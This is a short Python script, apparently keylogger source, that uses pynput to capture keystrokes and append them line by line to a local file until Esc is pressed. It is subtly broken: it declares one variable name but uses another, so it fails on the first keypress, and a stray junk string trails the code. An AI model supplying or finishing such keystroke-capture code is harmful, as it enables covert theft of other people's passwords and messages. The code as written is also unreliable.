from pynput.keyboard import Listener, Key

line = ""

def write_line(lines):
    with open("test_file", "a") as file:
        file.write(lines + "\n")

def on_press(key):
    global lines
    if key == Key.enter:
        write_line(lines)
        lines = ""
    elif str(key).replace("'", "").isalnum():
        lines += str(key).replace("'", "")
    elif key == Key.space:
        lines += " "

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()
fafaf
